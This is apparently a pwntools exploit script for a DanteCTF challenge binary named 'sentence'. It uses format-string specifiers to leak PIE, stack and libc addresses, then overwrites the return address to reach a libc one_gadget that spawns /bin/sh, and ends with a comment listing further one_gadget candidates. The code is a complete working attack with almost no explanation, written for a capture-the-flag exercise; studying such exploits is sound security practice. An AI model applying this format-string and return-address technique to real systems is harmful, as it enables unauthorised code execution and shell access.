#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./sentence")
context.arch = 'amd64'
#context.terminal = ['tmux','splitw','-h']
libc = ELF("./libc.so.6")
def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challs.dantectf.it", 31531)
    else:
        return process(elf.path)

io = start()

# pie leak, libc leak, ret address (stack leak)

# pie leak %13%p
# stack leak %15$p
io.sendline(b"%13$p %15$p")

# pie
io.recvuntil(b"Hi, ")
pie_leak = int(io.readuntil(b" ")[:-1], 16)
info(f"Pie leak: {hex(pie_leak)}")

elf.address = pie_leak - elf.sym.main
info(f"Pie base: {hex(elf.address)}")

# stack leak
stack_leak = int(io.readuntil(b" ")[:-1], 16)
info(f"Stack leak: {hex(stack_leak)}")

ret_addr = stack_leak - 272
info(f"Ret addr: {hex(ret_addr)}")

io.sendline(str(elf.sym._start).encode())
io.sendline(str(ret_addr).encode())

# libc leak %3$p
io.sendline(b"%3$p")
io.recvuntil(b"Hi, ")
libc_leak = int(io.readuntil(b" ")[:-1], 16)
info(f"Libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 1133111
info(f"Libc base: {hex(libc.address)}")

io.sendline(str(libc.address + 0x50a37).encode())
io.sendline(str(stack_leak - 528).encode())


io.interactive()

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''


